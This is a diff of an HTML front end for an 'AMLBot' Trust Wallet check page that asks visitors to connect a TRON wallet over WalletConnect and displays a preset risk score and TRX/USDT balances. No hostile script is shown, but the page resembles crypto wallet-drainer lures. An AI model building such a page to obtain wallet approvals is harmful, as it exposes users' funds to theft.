@@ -3,76 +3,54 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Проверка кошелька | AMLBot</title>
-  <script src="https://cdn.tailwindcss.com"></script>
+  <title>AMLBot — Trust Wallet Check</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"/>
-  <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
-  <style>
-    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
-    body { font-family: 'Inter', sans-serif; background: #f8fafc; }
-  </style>
+  <link rel="stylesheet" href="css/check.css?v=5"/>
 </head>
-<body class="min-h-screen bg-zinc-50">
+<body>
+  <header class="topbar">
+    <a class="logo" href="index.html"><i class="fa-solid fa-shield"></i> AMLBot</a>
+    <nav>
+      <a href="index.html">Home</a>
+      <a href="pricing.html">Pricing</a>
+      <a href="about.html">About</a>
+    </nav>
+  </header>
 
-  <nav class="bg-white border-b shadow-sm sticky top-0 z-50">
-    <div class="max-w-7xl mx-auto px-6 flex justify-between items-center h-16">
-      <span class="text-2xl font-bold text-blue-600">AMLBot</span>
-      <a href="index.html" class="text-gray-600 hover:text-gray-900 flex items-center gap-2">
-        <i class="fa-solid fa-arrow-left"></i> На главную
-      </a>
-    </div>
-  </nav>
-
-  <main class="max-w-4xl mx-auto px-6 py-16">
-
-    <h1 class="text-4xl font-bold text-center mb-12">Проверка кошелька</h1>
-
-    <div class="bg-white rounded-3xl shadow-xl p-10 text-center max-w-lg mx-auto">
-      <h2 class="text-3xl font-bold mb-6">WalletConnect</h2>
-      <p class="text-gray-600 mb-8 text-lg">
-        Отсканируйте QR-код в Trust Wallet<br/>
-        для проверки баланса TRX и USDT (TRC-20)
-      </p>
-
-      <button id="connectWalletBtn"
-              class="w-full bg-gradient-to-r from-purple-600 to-indigo-600 hover:from-purple-700 hover:to-indigo-700 text-white py-7 rounded-3xl text-2xl font-bold flex items-center justify-center gap-4 transition-all shadow-lg shadow-purple-500/40 hover:shadow-purple-600/50 hover:scale-[1.02]">
-        <i class="fa-solid fa-qrcode text-3xl"></i>
-        Подключить Trust Wallet (QR-код)
+  <main class="container">
+    <section class="hero-card">
+      <p class="chip">TRON Mainnet • WalletConnect v2</p>
+      <h1>Trust Wallet: TRX + USDT (TRC-20)</h1>
+      <p class="subtitle">Подключите Trust Wallet через WalletConnect и получите мгновенный AML-отчёт по адресу TRON.</p>
+      <button id="connectWalletBtn" class="connect-btn">
+        <i class="fa-solid fa-qrcode"></i>
+        <span>Подключить Trust Wallet</span>
       </button>
+      <p class="hint">Только TRON. Сети ETH/BNB не запрашиваются.</p>
+    </section>
 
-      <p class="text-sm text-gray-500 mt-6">
-        Откройте Trust Wallet → сканируйте QR → подтвердите подключение
-      </p>
-    </div>
-
-    <!-- Результат -->
-    <div id="result" class="hidden mt-16 bg-white rounded-3xl shadow-2xl p-10">
-      <h2 class="text-4xl font-bold text-center mb-10">Отчёт готов</h2>
-
-      <div class="text-center">
-        <div id="score" class="text-8xl font-black text-green-600 mb-4">92%</div>
-        <div id="scoreText" class="text-3xl font-bold mb-6 text-green-700">Высокая безопасность</div>
-        <div id="address" class="text-lg text-gray-700 mb-8 font-mono break-all bg-gray-100 p-5 rounded-2xl"></div>
+    <section id="result" class="result-card hidden">
+      <div class="score-wrap">
+        <p class="score-label">Risk score</p>
+        <div id="score" class="score-value">92%</div>
+        <p id="scoreText" class="score-text">Высокая безопасность</p>
       </div>
-
-      <div class="grid md:grid-cols-2 gap-8">
-        <div class="text-center p-8 bg-gray-50 rounded-2xl">
-          <div id="trxBal" class="text-5xl font-bold text-orange-600 mb-2">0.00</div>
-          <div class="text-2xl font-semibold text-orange-700">TRX</div>
-        </div>
-        <div class="text-center p-8 bg-gray-50 rounded-2xl">
-          <div id="usdtBal" class="text-5xl font-bold text-orange-600 mb-2">0.00</div>
-          <div class="text-2xl font-semibold text-orange-700">USDT (TRC-20)</div>
-        </div>
+      <div class="wallet-box">
+        <p class="wallet-title">TRON address</p>
+        <p id="address" class="wallet-address">—</p>
       </div>
-
-      <div class="text-center text-gray-500 mt-10 text-sm">
-        Проверено AMLBot • <span id="time"></span>
+      <div class="balances-grid">
+        <article class="balance-item trx"><p class="balance-name">TRX</p><p id="trxBal" class="balance-value">0.00 TRX</p></article>
+        <article class="balance-item usdt"><p class="balance-name">USDT (TRC-20)</p><p id="usdtBal" class="balance-value">0.00 USDT</p></article>
       </div>
-    </div>
-
+      <p class="check-time">Checked by AMLBot • <span id="time"></span></p>
+    </section>
   </main>
 
-  <script type="module" src="js/check.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.min.js"></script>
+  <script type="module" src="js/check.js?v=5"></script>
 </body>
 </html>
